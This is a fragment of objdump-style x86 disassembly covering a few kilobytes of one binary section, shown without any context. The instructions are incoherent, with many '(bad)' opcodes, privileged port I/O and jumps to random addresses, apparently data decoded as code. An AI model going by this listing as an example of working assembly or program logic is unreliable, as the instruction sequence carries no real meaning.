  418631:	mov    esp,0x86418df2
  418636:	pop    DWORD PTR [edi+0x0]
  418639:	aaa    
  41863a:	add    eax,0x9c81225
  41863f:	mov    bh,0xee
  418641:	dec    edi
  418642:	lods   al,BYTE PTR ds:[esi]
  418643:	(bad)  
  418644:	repz test eax,0xb6da0976
  41864a:	xchg   esi,eax
  41864b:	pop    ecx
  41864c:	in     eax,dx
  41864d:	icebp  
  41864e:	inc    esi
  41864f:	sbb    BYTE PTR [edx-0x4e],bl
  418652:	(bad)  
  418653:	imul   ebp,DWORD PTR [edx],0x647fe5be
  418659:	mov    al,0xd8
  41865b:	mov    esp,0x92448844
  418660:	call   0x7982bf9c
  418665:	cmp    eax,0xa8c6efb5
  41866a:	pop    es
  41866b:	adc    al,ch
  41866d:	pop    ecx
  41866e:	ins    BYTE PTR es:[edi],dx
  41866f:	mov    ds:0xcd1e0db5,al
  418674:	sub    eax,DWORD PTR [edx+ecx*2]
  418677:	shl    BYTE PTR [esi+0x663851a6],cl
  41867d:	sahf   
  41867e:	mov    dl,BYTE PTR [esi-0x376f8f13]
  418684:	jne    0x418697
  418686:	push   esp
  418687:	push   edx
  418688:	dec    esi
  418689:	scas   eax,DWORD PTR es:[edi]
  41868a:	jge    0x4186c4
  41868c:	clc    
  41868d:	sub    al,0xcf
  41868f:	ret    
  418690:	mov    ebp,DWORD PTR [ecx+0x29]
  418693:	das    
  418694:	mov    ?,edi
  418696:	ds pop edx
  418698:	mov    dl,0x65
  41869a:	stc    
  41869b:	dec    ebx
  41869c:	lock mov BYTE PTR [ecx+ecx*4-0x39266c38],bl
  4186a4:	sub    BYTE PTR [edx+0x7f],al
  4186a7:	mov    bh,BYTE PTR [eax]
  4186a9:	sub    esp,DWORD PTR [edx]
  4186ab:	cwde   
  4186ac:	in     eax,dx
  4186ad:	mov    al,ds:0xe8e6b571
  4186b2:	pusha  
  4186b3:	icebp  
  4186b4:	int    0x5
  4186b6:	fld    TBYTE PTR [esi+0x63]
  4186b9:	rol    BYTE PTR [eax],1
  4186bb:	adc    BYTE PTR ds:0x87692105,al
  4186c1:	inc    ebp
  4186c2:	sbb    al,0x7a
  4186c4:	mov    ds:0x21c32da9,al
  4186c9:	aad    0x6c
  4186cb:	inc    edx
  4186cc:	pop    ebp
  4186cd:	call   0x9b70228
  4186d2:	xor    edi,ebx
  4186d4:	test   BYTE PTR [edi],dl
  4186d6:	pusha  
  4186d7:	jae    0x4186a9
  4186d9:	cmp    al,BYTE PTR [esi]
  4186db:	loop   0x418699
  4186dd:	loope  0x41866c
  4186df:	mov    eax,0x40f66216
  4186e4:	or     DWORD PTR ds:0x82290243,0xc5449321
  4186ee:	call   0xb982d4e3
  4186f3:	sub    DWORD PTR [ecx+eiz*8-0x502942e3],ebp
  4186fa:	out    0x21,eax
  4186fc:	sbb    ebx,esp
  4186fe:	in     eax,dx
  4186ff:	jmp    FWORD PTR [ebp-0x73]
  418702:	ds jne 0x4186d9
  418705:	and    al,0x99
  418707:	jecxz  0x418777
  418709:	mov    edi,0x32634950
  41870e:	iret   
  41870f:	stos   BYTE PTR es:[edi],al
  418710:	mov    al,0x35
  418712:	pop    esi
  418713:	aad    0xf7
  418715:	xchg   DWORD PTR [edi-0x54313580],ebp
  41871b:	sbb    eax,esi
  41871d:	pop    ss
  41871e:	fild   DWORD PTR [eax-0x6c860924]
  418724:	add    ebp,DWORD PTR [ebp+0x31]
  418727:	out    dx,eax
  418728:	sub    al,0xfc
  41872a:	loope  0x418734
  41872c:	in     al,0x4e
  41872e:	sbb    dh,dl
  418730:	(bad)  
  418731:	mov    ds:0x9d9d0872,eax
  418736:	xchg   DWORD PTR ds:0x2229695d,edx
  41873c:	pushf  
  41873d:	inc    ebx
  41873e:	pop    ebp
  41873f:	cdq    
  418740:	xchg   ebp,eax
  418741:	push   ebp
  418742:	sbb    dh,BYTE PTR [ebp*1-0xf8e9a98]
  418749:	mov    dl,0xa2
  41874b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41874c:	xchg   BYTE PTR [ebx-0x2c],cl
  41874f:	push   0x54
  418751:	clc    
  418752:	jmp    0x41874e
  418754:	jae    0x418786
  418756:	cdq    
  418757:	inc    esi
  418758:	and    ah,BYTE PTR [esi+edx*2+0x56]
  41875c:	js     0x418704
  41875e:	aad    0x60
  418760:	cli    
  418761:	push   ecx
  418762:	rol    BYTE PTR [esi-0x74],0xeb
  418766:	cld    
  418767:	or     BYTE PTR [eax-0x5400ab5a],dl
  41876d:	dec    esp
  41876e:	xlat   BYTE PTR ds:[ebx]
  41876f:	in     al,0xa
  418771:	lahf   
  418772:	push   eax
  418773:	xor    DWORD PTR [edx],0xffffff8c
  418776:	stos   BYTE PTR es:[edi],al
  418777:	jne    0x4187cb
  418779:	sbb    al,0x6b
  41877b:	and    ebp,edx
  41877d:	dec    ebx
  41877e:	call   0xb6be4bbc
  418783:	sub    esi,edx
  418785:	dec    edx
  418786:	in     eax,dx
  418787:	icebp  
  418788:	inc    edx
  418789:	jle    0x4187e1
  41878b:	(bad)  
  41878c:	pop    ebx
  41878d:	outs   dx,DWORD PTR ds:[esi]
  41878e:	push   ebp
  41878f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418790:	retf   0xe798
  418793:	inc    esi
  418794:	cld    
  418795:	es sub eax,0xf4decdff
  41879b:	pop    ecx
  41879c:	push   ebx
  41879d:	clc    
  41879e:	pop    ecx
  41879f:	mov    cs,WORD PTR [esi+0x1d2f65f]
  4187a5:	xchg   edx,eax
  4187a6:	scas   eax,DWORD PTR es:[edi]
  4187a7:	lea    edx,[eax+esi*2+0x42]
  4187ab:	lea    esp,ds:0x7dc7f20b
  4187b1:	inc    esp
  4187b2:	push   ss
  4187b3:	cli    
  4187b4:	scas   eax,DWORD PTR es:[edi]
  4187b5:	imul   esi,DWORD PTR [eax],0xffffffd7
  4187b8:	ds dec edx
  4187ba:	xor    eax,0x12303665
  4187bf:	sahf   
  4187c0:	lock cmp BYTE PTR [ebx],ah
  4187c3:	add    DWORD PTR [ebx-0x69],ebp
  4187c6:	add    dh,BYTE PTR [ebx+0x3b271b1]
  4187cc:	mov    bh,BYTE PTR [esi]
  4187ce:	repz sub BYTE PTR [edi-0x559bafba],al
  4187d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187d6:	(bad)  
  4187d7:	cwde   
  4187d8:	xchg   esi,eax
  4187d9:	sub    BYTE PTR [ecx],ah
  4187db:	test   eax,0xe8e418cf
  4187e0:	jnp    0x41877d
  4187e2:	pop    eax
  4187e3:	inc    esi
  4187e4:	rcl    DWORD PTR [eax],1
  4187e6:	cmp    ch,dh
  4187e8:	fwait
  4187e9:	pop    ebx
  4187ea:	outs   dx,DWORD PTR ds:[esi]
  4187eb:	ror    BYTE PTR [ecx],1
  4187ed:	xchg   BYTE PTR [eax],bl
  4187ef:	dec    edi
  4187f0:	fisttp DWORD PTR [edi+0x6b5784f3]
  4187f6:	dec    edi
  4187f7:	das    
  4187f8:	jns    0x4187ac
  4187fa:	(bad)  
  4187fb:	xchg   ebx,eax
  4187fc:	xchg   ebx,eax
  4187fd:	dec    edx
  4187fe:	jmp    0x9d987ecb
  418803:	verr   WORD PTR [edx-0x11ceb90]
  41880a:	inc    esp
  41880b:	cli    
  41880c:	ins    DWORD PTR es:[edi],dx
  41880d:	inc    ebx
  41880e:	daa    
  41880f:	sti    
  418810:	and    edi,DWORD PTR [ebx+0x713a424d]
  418816:	push   ecx
  418817:	or     esi,DWORD PTR [esp+edi*1]
  41881a:	ss sub eax,0x9975fddc
  418821:	dec    ebp
  418822:	push   ds
  418823:	or     al,0xe7
  418825:	ins    BYTE PTR es:[edi],dx
  418826:	cmp    eax,0x3694d87d
  41882b:	xlat   BYTE PTR ds:[ebx]
  41882c:	mov    al,ds:0x45aa26cf
  418831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418832:	nop    DWORD PTR [esi-0x26]
  418836:	adc    BYTE PTR [eax+0x57],bl
  418839:	lods   al,BYTE PTR ds:[esi]
  41883a:	mov    ebp,0x847cf7a7
  41883f:	mov    BYTE PTR [eax-0x80],cl
  418842:	(bad)  [edx-0x58]
  418845:	fisttp DWORD PTR [eiz*4-0x7e95512a]
  41884c:	lds    eax,FWORD PTR [edi-0x5fd8189d]
  418852:	jno    0x41885a
  418854:	jmp    0x5934:0xa01b194d
  41885b:	fsubrp st(2),st
  41885d:	dec    esp
  41885e:	sbb    ebp,DWORD PTR [esi+0x19794c83]
  418864:	arpl   cx,si
  418866:	jmp    0xe4f03d2d
  41886b:	adc    DWORD PTR [edx+0x5d],ebp
  41886e:	sbb    al,0xe8
  418870:	out    dx,al
  418871:	mov    eax,0xf054fc59
  418876:	in     eax,dx
  418877:	in     al,0x3b
  418879:	jno    0x418888
  41887b:	or     BYTE PTR [ebx+eiz*8+0x4a5715ef],dh
  418882:	retf   
  418883:	mov    eax,0xb5b20ee4
  418888:	mov    esp,0x6f4a0e18
  41888d:	mov    eax,ds:0xccd2d062
  418892:	and    BYTE PTR [edx],bh
  418894:	mov    eax,ds:0x1948241b
  418899:	ret    
  41889a:	sub    eax,0xf035aab
  41889f:	pop    es
  4188a0:	pop    ss
  4188a1:	xchg   edi,eax
  4188a2:	and    al,0xea
  4188a4:	pop    ebp
  4188a5:	add    dl,ah
  4188a7:	adc    eax,0xe0f7fbd9
  4188ac:	std    
  4188ad:	or     eax,0x3b55e6fc
  4188b2:	jne    0x41889b
  4188b4:	push   ecx
  4188b5:	lahf   
  4188b6:	lods   al,BYTE PTR ds:[esi]
  4188b7:	add    edi,esi
  4188b9:	and    edx,ebp
  4188bb:	mov    esi,DWORD PTR [edx+0x49]
  4188be:	pop    esi
  4188bf:	dec    esi
  4188c0:	inc    ecx
  4188c1:	cli    
  4188c2:	adc    ebx,esp
  4188c4:	add    eax,0x41d5d7f1
  4188c9:	int3   
  4188ca:	mov    fs,WORD PTR [ebp+0x43fd8076]
  4188d0:	mov    DWORD PTR [esi-0x4e],0x2eb3ede7
  4188d7:	jns    0x418866
  4188d9:	stc    
  4188da:	dec    ecx
  4188db:	(bad)  
  4188dc:	(bad)  
  4188de:	xor    BYTE PTR [esi],dh
  4188e0:	dec    esp
  4188e1:	xchg   ecx,eax
  4188e2:	jg     0x41895d
  4188e4:	sbb    DWORD PTR [edx-0x12fd7011],0x92ce55f6
  4188ee:	fdiv   QWORD PTR [esp+ebp*8]
  4188f1:	push   ds
  4188f2:	in     eax,0xdb
  4188f4:	and    eax,0x79261a69
  4188f9:	aad    0x26
  4188fb:	pop    eax
  4188fc:	xor    DWORD PTR [edx],edi
  4188fe:	jbe    0x4188aa
  418900:	dec    edi
  418901:	cwde   
  418902:	jmp    0x4f3cfbba
  418907:	punpckldq mm7,DWORD PTR [ecx+eax*2-0x2b]
  41890c:	ror    DWORD PTR [edi-0x43],0xd2
  418910:	jle    0x41891a
  418912:	ror    DWORD PTR [eax+edx*1+0x10c9164a],1
  418919:	jmp    0xfad2da45
  41891e:	ficom  WORD PTR [eax+0x3ac1aab8]
  418924:	jb     0x418951
  418926:	fild   WORD PTR ds:[edi-0x25]
  41892a:	in     eax,0xc0
  41892c:	sbb    ebp,DWORD PTR [esi*4-0x5664b80]
  418933:	pop    ss
  418934:	fneni(8087 only) 
  418936:	xchg   ecx,eax
  418937:	int3   
  418938:	mov    eax,0x950fa8f4
  41893d:	sub    esi,DWORD PTR [edx+0x4e0b6c50]
  418943:	or     dl,cl
  418945:	xor    DWORD PTR [ecx+0x23481050],edx
  41894b:	ficomp WORD PTR [ebx+edx*4+0x74]
  41894f:	repnz rcr DWORD PTR [eax-0x69],0x49
  418954:	int3   
  418955:	xchg   esi,eax
  418956:	(bad)  
  418957:	xor    esi,DWORD PTR ds:[edx]
  41895a:	inc    esp
  41895b:	repnz inc eax
  41895d:	pop    ds
  41895e:	nop
  41895f:	mov    ebp,0xe1392a39
  418964:	test   dh,ch
  418966:	inc    ebp
  418967:	mov    edx,0x8ac8c582
  41896c:	gs and eax,0x7f12d7e0
  418972:	(bad)  [eax]
  418974:	cwde   
  418975:	jle    0x4189a9
  418977:	sub    al,0xd9
  418979:	jge    0x4189ce
  41897b:	fdiv   DWORD PTR [ecx+0x2c6b30d7]
  418981:	mov    ds:0x7082dcfa,al
  418986:	cmp    bh,BYTE PTR [eax]
  418988:	xor    al,0x21
  41898a:	xor    al,0xae
  41898c:	test   BYTE PTR [ecx+0x1e4fb6e0],dl
  418992:	push   esi
  418993:	lock push es
  418995:	inc    esp
  418996:	popf   
  418997:	daa    
  418998:	in     al,dx
  418999:	mov    cs,edx
  41899b:	cmc    
  41899c:	inc    edi
  41899d:	xor    edi,DWORD PTR [ebx-0x411b3cde]
  4189a3:	jg     0x41893b
  4189a5:	aam    0x19
  4189a7:	mov    eax,0xc74e2444
  4189ac:	xor    edx,DWORD PTR [edx]
  4189ae:	pop    edi
  4189af:	jmp    0x46a3fdd4
  4189b4:	clc    
  4189b5:	mov    cl,BYTE PTR [esi-0x5fe83afb]
  4189bb:	mov    bh,0x90
  4189bd:	jp     0x4189d3
  4189bf:	neg    DWORD PTR [ecx-0x78]
  4189c2:	ins    BYTE PTR es:[edi],dx
  4189c3:	out    dx,eax
  4189c4:	ficom  WORD PTR [ebp+0x26315cb5]
  4189ca:	pop    ecx
  4189cb:	lods   eax,DWORD PTR ds:[esi]
  4189cc:	and    bh,BYTE PTR [ebx+0x63]
  4189cf:	and    WORD PTR [ebx],0x46
  4189d3:	mov    bh,0xf6
  4189d5:	xlat   BYTE PTR ds:[ebx]
  4189d6:	mov    esi,0xb74b6be0
  4189db:	jmp    FWORD PTR [ecx+0x418c6666]
  4189e1:	jo     0x41897e
  4189e3:	adc    eax,DWORD PTR [edx-0x58]
  4189e6:	push   esi
  4189e7:	lods   al,BYTE PTR ds:[esi]
  4189e8:	pop    ss
  4189e9:	mov    eax,0x22b46f18
  4189ee:	dec    eax
  4189ef:	call   0x1417:0x51caa714
  4189f6:	cld    
  4189f7:	leave  
  4189f8:	outs   dx,BYTE PTR ds:[esi]
  4189f9:	sti    
  4189fa:	or     al,al
  4189fc:	push   0x5c
  4189fe:	jbe    0x418a35
  418a00:	sub    bh,BYTE PTR [ebp+0x20]
  418a03:	mov    dh,BYTE PTR [edi-0x2]
  418a06:	inc    ecx
  418a07:	popf   
  418a08:	adc    cl,cl
  418a0a:	clc    
  418a0b:	ds mov esi,0x8c6b0549
  418a11:	sbb    al,0xfe
  418a13:	sbb    edi,esi
  418a15:	cmp    eax,0xe7124ac9
  418a1a:	sub    al,0x6d
  418a1c:	mov    eax,ds:0x46880cad
  418a21:	loop   0x4189af
  418a23:	and    BYTE PTR [ebx+0x46],0x1
  418a27:	iret   
  418a28:	cmp    esp,DWORD PTR [ebp+0x38]
  418a2b:	inc    edx
  418a2c:	loope  0x418aa3
  418a2e:	xchg   edi,eax
  418a2f:	inc    eax
  418a30:	jno    0x418aa9
  418a32:	dec    esi
  418a33:	lods   eax,DWORD PTR ds:[esi]
  418a34:	and    eax,0xb05345c0
  418a39:	push   0xe5da62ab
  418a3e:	inc    eax
  418a3f:	aas    
  418a40:	mov    ds:0x54c1a12b,eax
  418a45:	cli    
  418a46:	dec    esi
  418a47:	test   bl,dh
  418a49:	sbb    BYTE PTR [edx+ecx*2+0x633f8327],bl
  418a50:	clc    
  418a51:	push   edx
  418a52:	sub    DWORD PTR [ebx],edx
  418a54:	inc    esp
  418a55:	ret    
  418a56:	mov    eax,ds:0x818784f
  418a5b:	push   cs
  418a5c:	push   ebp
  418a5e:	fisttp QWORD PTR [edi]
  418a60:	fs push edx
  418a62:	xchg   edx,eax
  418a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a64:	jae    0x418a91
  418a66:	mov    cl,0x97
  418a68:	and    dh,dl
  418a6a:	stos   DWORD PTR es:[edi],eax
  418a6b:	and    DWORD PTR [edi],0xffffffa6
  418a6e:	push   esp
  418a6f:	xchg   edi,eax
  418a70:	cmp    DWORD PTR [edi],esi
  418a72:	xchg   ecx,eax
  418a73:	or     DWORD PTR [edx],edx
  418a75:	lea    edx,[ebx]
  418a77:	retf   0xd6d9
  418a7a:	daa    
  418a7b:	pop    ebp
  418a7c:	in     al,dx
  418a7d:	lods   al,BYTE PTR ds:[esi]
  418a7e:	faddp  st(7),st
  418a80:	rcl    DWORD PTR [esi],0x54
  418a83:	jge    0x418afd
  418a85:	fsub   st,st(5)
  418a87:	add    eax,0x64271e84
  418a8c:	jo     0x418a81
  418a8e:	jge    0x418a7b
  418a90:	cli    
  418a91:	cmc    
  418a92:	pop    edi
  418a93:	and    al,0xbf
  418a95:	pop    esp
  418a96:	loope  0x418af5
  418a98:	cld    
  418a99:	ret    
  418a9a:	loope  0x418b0b
  418a9c:	lds    edx,FWORD PTR [ebx]
  418a9e:	mov    edx,0x5a3978b0
  418aa3:	mov    es,eax
  418aa5:	inc    eax
  418aa6:	mov    WORD PTR [esi+0x44],ds
  418aa9:	dec    ecx
  418aaa:	add    esi,0x8f0127d4
  418ab0:	clc    
  418ab1:	idiv   DWORD PTR [ecx+0x30fdb45e]
  418ab7:	xlat   BYTE PTR ds:[ebx]
  418ab8:	add    ch,BYTE PTR [ecx]
  418aba:	iret   
  418abb:	xlat   BYTE PTR ds:[ebx]
  418abc:	fstp   QWORD PTR [ebx]
  418abe:	stos   DWORD PTR es:[edi],eax
  418abf:	gs (bad) 
  418ac1:	fdiv   st,st(3)
  418ac3:	dec    esi
  418ac4:	mov    ebp,0x209cbab
  418ac9:	dec    DWORD PTR [edx]
  418acb:	inc    ebp
  418acc:	mov    esi,0x212d44a
  418ad1:	das    
  418ad2:	popa   
  418ad3:	mov    dl,0xad
  418ad5:	xchg   esi,eax
  418ad6:	aas    
  418ad7:	inc    edi
  418ad8:	and    BYTE PTR [ebx-0x4],bl
  418adb:	push   ebx
  418adc:	data16 sbb al,0x1c
  418adf:	daa    
  418ae0:	push   eax
  418ae1:	mov    bh,0xa1
  418ae3:	push   ebp
  418ae4:	mov    ds:0xb8bbbbae,al
  418ae9:	sar    DWORD PTR [eax+0x3eacd3],0x25
  418af0:	dec    esi
  418af1:	dec    ecx
  418af2:	xor    eax,0xadf8e258
  418af7:	cs shl ebx,1
  418afa:	leave  
  418afb:	xchg   ebx,eax
  418afc:	jnp    0x418b0a
  418afe:	jae    0x418af2
  418b00:	xchg   BYTE PTR [ecx-0x12],cl
  418b03:	repnz repnz add eax,0xac520ef
  418b0a:	ins    DWORD PTR es:[edi],dx
  418b0b:	daa    
  418b0c:	repnz repnz lea esi,[edx-0x46]
  418b11:	mov    ch,0xaa
  418b13:	ret    
  418b14:	dec    edi
  418b15:	jle    0x418b65
  418b17:	enter  0xeea4,0x58
  418b1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b1c:	(bad)  
  418b1d:	mov    esi,0x46ef2621
  418b22:	test   BYTE PTR [ebx-0x1c2c3207],dh
  418b28:	sti    
  418b29:	push   esp
  418b2a:	add    ebp,ebx
  418b2c:	aaa    
  418b2d:	inc    esp
  418b2e:	pop    es
  418b2f:	sahf   
  418b30:	cwde   
  418b31:	sar    BYTE PTR [edi+0x19],0xa4
  418b35:	repz inc ecx
  418b37:	inc    eax
  418b38:	mov    esi,0x30284c2b
  418b3d:	mov    ah,0x92
  418b3f:	mov    eax,0x5cb4d568
  418b44:	inc    edx
  418b46:	jmp    0x418b42
  418b48:	xchg   edi,eax
  418b49:	push   0x6
  418b4b:	out    dx,eax
  418b4c:	es enter 0x3b07,0x77
  418b51:	(bad)  
  418b52:	popf   
  418b53:	xchg   DWORD PTR [bx+si],ecx
  418b56:	addps  xmm2,XMMWORD PTR [eax+0x5a]
  418b5a:	dec    ecx
  418b5b:	sti    
  418b5c:	rol    DWORD PTR [esi-0x43bdcefb],1
  418b62:	mov    dh,0x8
  418b64:	ins    DWORD PTR es:[edi],dx
  418b65:	mov    ch,0xf6
  418b67:	arpl   WORD PTR [ebx],sp
  418b69:	dec    ebx
  418b6a:	inc    ebp
  418b6b:	add    DWORD PTR [eax+ecx*4-0x2bd42f53],ebp
  418b72:	add    eax,0xe484d92a
  418b77:	hlt    
  418b78:	dec    ebp
  418b79:	push   ebp
  418b7a:	mov    esi,0x509f8d3f
  418b7f:	ins    DWORD PTR es:[edi],dx
  418b80:	push   esp
  418b81:	mov    ebx,0x2a49f539
  418b86:	and    BYTE PTR ds:0xb968,dh
  418b8b:	push   0x334ae96f
  418b90:	aas    
  418b91:	and    DWORD PTR [ebp+0x6a],ecx
  418b94:	in     al,dx
  418b95:	leave  
  418b96:	pop    eax
  418b97:	loope  0x418be4
  418b99:	pop    esp
  418b9a:	aas    
  418b9b:	pop    eax
  418b9c:	fild   QWORD PTR [ebp-0x1a790f1e]
  418ba2:	movzx  esp,dx
  418ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ba6:	out    0xb0,al
  418ba8:	mov    bl,0x9c
  418baa:	inc    edi
  418bab:	ins    BYTE PTR es:[edi],dx
  418bac:	mov    ah,0x1d
  418bae:	das    
  418baf:	(bad)  
  418bb0:	add    DWORD PTR [edi+0x25],ecx
  418bb3:	fisub  DWORD PTR [eax-0x18]
  418bb6:	dec    eax
  418bb7:	add    dh,BYTE PTR [ecx]
  418bb9:	in     al,dx
  418bba:	ret    0x46f0
  418bbd:	xchg   edx,eax
  418bbe:	retf   
  418bbf:	shl    DWORD PTR [esi],cl
  418bc1:	push   edx
  418bc2:	add    edx,DWORD PTR [ecx-0x7b86313e]
  418bc8:	jbe    0x418b9d
  418bca:	dec    eax
  418bcb:	hlt    
  418bcc:	iret   
  418bcd:	add    al,0x4
  418bcf:	mov    esi,0xdb81339d
  418bd4:	mov    ah,0x84
  418bd6:	pushf  
  418bd7:	mov    bl,0x3f
  418bd9:	stos   DWORD PTR es:[edi],eax
  418bda:	fcom   QWORD PTR [edi+0x24]
  418bdd:	hlt    
  418bde:	test   BYTE PTR [ebp+0x27],ah
  418be1:	mov    ebp,0x55c91ba5
  418be6:	push   ss
  418be7:	retf   
  418be8:	jbe    0x418c59
  418bea:	xor    eax,0x641f7623
  418bef:	rcl    DWORD PTR [edi-0x78212218],cl
  418bf5:	mov    eax,ds:0x3252c42c
  418bfa:	mov    ecx,0x8dba98b7
  418bff:	ja     0x418c0d
  418c01:	aam    0x13
  418c03:	mov    ch,0x18
  418c05:	lds    esp,FWORD PTR [esi]
  418c07:	inc    ecx
  418c08:	outs   dx,BYTE PTR ds:[esi]
  418c09:	popa   
  418c0a:	or     ecx,DWORD PTR [edx-0x3f3ce7c6]
  418c10:	imul   ecx,DWORD PTR [edx-0x7fdf0ad9],0x5f
  418c17:	push   cs
  418c18:	xor    ah,BYTE PTR [ebp+0x4d548820]
  418c1e:	sbb    BYTE PTR [esi-0x7f],bh
  418c21:	ins    BYTE PTR es:[edi],dx
  418c22:	push   ebx
  418c23:	ins    DWORD PTR es:[edi],dx
  418c24:	xor    al,0x5d
  418c26:	js     0x418c1b
  418c28:	lahf   
  418c29:	bound  edi,QWORD PTR [eax+0x33]
  418c2c:	and    cl,BYTE PTR [edx]
  418c2e:	mov    fs,WORD PTR es:[edx+0x50c06bd6]
  418c35:	jnp    0x418c6b
  418c37:	push   eax
  418c38:	ror    ah,1
  418c3a:	mov    eax,ds:0x44137781
  418c3f:	dec    esi
  418c40:	(bad)  
  418c41:	in     al,dx
  418c42:	in     eax,dx
  418c43:	icebp  
  418c44:	dec    esp
  418c45:	cld    
  418c46:	loopne 0x418c71
  418c48:	test   BYTE PTR [edi-0x5bba9fb1],0x82
  418c4f:	inc    ebp
  418c50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c51:	jnp    0x418c92
  418c53:	aaa    
  418c54:	mov    cl,0xdb
  418c56:	xor    dl,bl
  418c58:	out    dx,eax
  418c59:	fwait
  418c5a:	ss push edi
  418c5c:	pop    esp
  418c5d:	mov    eax,0x8990b037
  418c62:	xor    BYTE PTR [edx],0xcf
  418c65:	mov    ch,BYTE PTR [eax+0x23]
  418c68:	adc    dh,bh
  418c6a:	sub    DWORD PTR [ecx],esi
  418c6c:	add    BYTE PTR [esi],ch
  418c6e:	pop    ebp
  418c6f:	ror    DWORD PTR [edi],cl
  418c71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c72:	push   cs
  418c73:	lds    ecx,FWORD PTR [edi+0x5cdf4c93]
  418c79:	push   ds
  418c7a:	push   eax
  418c7b:	xor    DWORD PTR [ecx],0xc
  418c7e:	sub    cl,dh
  418c80:	jo     0x418c9d
  418c82:	xchg   edi,eax
  418c83:	sub    esi,DWORD PTR [edi+esi*8-0x2dd650a8]
  418c8a:	scas   al,BYTE PTR es:[edi]
  418c8b:	and    dh,BYTE PTR [edi]
  418c8d:	into   
  418c8e:	mov    dl,0x5b
  418c90:	dec    edi
  418c91:	ficom  WORD PTR [esp+esi*2]
  418c94:	ds daa 
  418c96:	stos   BYTE PTR es:[edi],al
  418c97:	mov    ebp,0xc980b09c
  418c9c:	les    eax,FWORD PTR [edx-0x6c124304]
  418ca2:	mov    cs,WORD PTR [eax+eiz*2+0x3a]
  418ca6:	sbb    DWORD PTR [ebp-0x75],0xffffffda
  418caa:	jl     0x418d07
  418cac:	adc    ch,BYTE PTR [edx]
  418cae:	xchg   edi,eax
  418caf:	push   ss
  418cb0:	stos   BYTE PTR es:[edi],al
  418cb1:	pop    ds
  418cb2:	outs   dx,BYTE PTR ds:[esi]
  418cb3:	add    eax,0xc242a604
  418cb8:	inc    esp
  418cb9:	fstp   QWORD PTR [esi+0x7c9998fb]
  418cbf:	inc    ch
  418cc1:	sar    BYTE PTR [esi],1
  418cc3:	mov    cx,0x6917
  418cc7:	or     eax,0x7c907db
  418ccc:	xor    al,0x3
  418cce:	loope  0x418c64
  418cd0:	das    
  418cd1:	arpl   WORD PTR [edx-0x157a7108],sp
  418cd7:	(bad)  
  418cd8:	fild   DWORD PTR ds:0x3904adfd
  418cde:	cmp    eax,0x93fa55ae
  418ce3:	jnp    0x418d34
  418ce5:	mov    al,BYTE PTR ds:0x91679c66
  418ceb:	adc    BYTE PTR [ecx],dl
  418ced:	addr16 cmp dh,dl
  418cf0:	pop    esi
  418cf1:	mov    al,0xc9
  418cf3:	xchg   edi,eax
  418cf4:	(bad)  
  418cf5:	retf   0x25ce
  418cf8:	jmp    DWORD PTR [ebx-0x63]
  418cfb:	and    DWORD PTR [ebx],ebx
  418cfd:	mov    eax,0x81a6b515
  418d02:	adc    ecx,DWORD PTR [esi+0x22a57f45]
  418d08:	sbb    ebx,DWORD PTR [ecx+0x274403b8]
  418d0e:	in     al,dx
  418d0f:	xchg   esi,eax
  418d10:	shl    esi,0xe4
  418d13:	call   0x645a:0xfc872a47
  418d1a:	data16 (bad) 
  418d1c:	leave  
  418d1d:	icebp  
  418d1e:	pop    ecx
  418d1f:	inc    si
  418d21:	push   esi
  418d22:	ins    DWORD PTR es:[edi],dx
  418d23:	mul    BYTE PTR [edi]
  418d25:	(bad)  
  418d26:	rol    BYTE PTR cs:[edi-0x460beef8],0xee
  418d2e:	cs push esp
  418d30:	push   esi
  418d31:	jbe    0x418cbe
  418d33:	jge    0x418d17
  418d35:	and    al,0x50
  418d37:	(bad)  
  418d38:	ds jnp 0x418cc8
  418d3b:	call   0xbd9c:0x7403a069
  418d42:	rcr    BYTE PTR [edx-0x3d],cl
  418d45:	jb     0x418cc9
  418d47:	pop    ss
  418d48:	xchg   esp,esp
  418d4a:	xor    al,0xd9
  418d4c:	add    cl,BYTE PTR [ebp-0x647d10dd]
  418d52:	inc    ecx
  418d53:	daa    
  418d54:	pop    ss
  418d55:	dec    ebx
  418d56:	dec    ebx
  418d57:	iret   
  418d58:	mov    esp,0x748f4cfd
  418d5d:	sub    esp,DWORD PTR [edx-0x2bc13cfd]
  418d63:	(bad)  
  418d64:	xchg   ebp,eax
  418d65:	sub    BYTE PTR [esi+0x51],0x4c
  418d69:	rol    BYTE PTR [ecx-0x7fb29b4b],cl
  418d6f:	push   ds
  418d70:	xchg   edx,eax
  418d71:	pop    eax
  418d72:	test   BYTE PTR [edi+0x277eb773],al
  418d78:	jo     0x418d41
  418d7a:	dec    ebp
  418d7b:	in     eax,dx
  418d7c:	gs add edi,edx
  418d7f:	and    DWORD PTR [ebx+0x5d859366],0x5e
  418d86:	pop    edi
  418d87:	sub    eax,0xb3cb3b12
  418d8c:	mov    dl,0xe
  418d8e:	pop    esi
  418d8f:	mov    dl,0x99
  418d91:	inc    edi
  418d92:	shr    DWORD PTR [esi-0x1dc5a23c],0x3d
  418d99:	retf   0x9203
  418d9c:	pop    ds
  418d9d:	lea    esp,[ebx-0x71]
  418da0:	inc    eax
  418da1:	js     0x418e0a
  418da3:	or     esi,esp
  418da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418da6:	ss fwait
  418da8:	cdq    
  418da9:	and    edi,DWORD PTR [edi+0x71]
  418dac:	inc    esi
  418dad:	js     0x418da2
  418daf:	iret   
  418db0:	dec    esp
  418db1:	push   edi
  418db2:	jle    0x418e05
  418db4:	mov    cl,BYTE PTR [edi+0x22]
  418db7:	test   al,0xd7
  418db9:	hlt    
  418dba:	ins    DWORD PTR es:[edi],dx
  418dbb:	aad    0xd
  418dbd:	cmp    bh,0xc0
  418dc0:	out    0xd6,al
  418dc2:	je     0x418ddc
  418dc4:	jae    0x418d5b
  418dc6:	adc    DWORD PTR [ebx-0x51dd148e],0x19d0ed1b
  418dd0:	inc    ebx
  418dd1:	adc    esi,edi
  418dd3:	mov    dh,0x5e
  418dd5:	mov    dh,0xee
